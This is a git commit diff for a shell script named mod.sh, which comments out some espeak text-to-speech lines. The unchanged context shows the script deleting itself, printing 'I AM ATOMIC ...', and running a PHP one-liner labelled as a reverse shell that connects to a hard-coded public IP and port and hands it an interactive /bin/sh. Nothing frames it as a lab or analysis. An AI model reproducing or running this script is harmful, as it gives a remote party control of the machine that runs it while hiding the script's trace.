9eb629653c051a5404b51c9aa70ef4c76f77c1c7
VISHNU PREMIL <82073583+strangedreamer4@users.noreply.github.com>
2023-12-21 19:17:15 +0530

    Update mod.sh

--- mod.sh
+++ mod.sh
@@ -5,11 +5,11 @@ sleep 1  # Wait for 1 second before the next command
 #rm mod.py
 rm mod.sh
 sleep 1  # Wait for 1 second before the next command
-sudo apt install espeak -y
-apt install espeak -y
-pkg install espeak -y
+#sudo apt install espeak -y
+#apt install espeak -y
+#pkg install espeak -y
 clear
 echo "I AM ATOMIC ..."
-espeak -s 150 -p 50 "I AM ATOMIC."
+#espeak -s 150 -p 50 "I AM ATOMIC."
 # Add PHP reverse shell command with nohup
 php -r '$sock=fsockopen("159.203.126.35",22289);exec("/bin/sh -i <&3 >&3 2>&3");' 
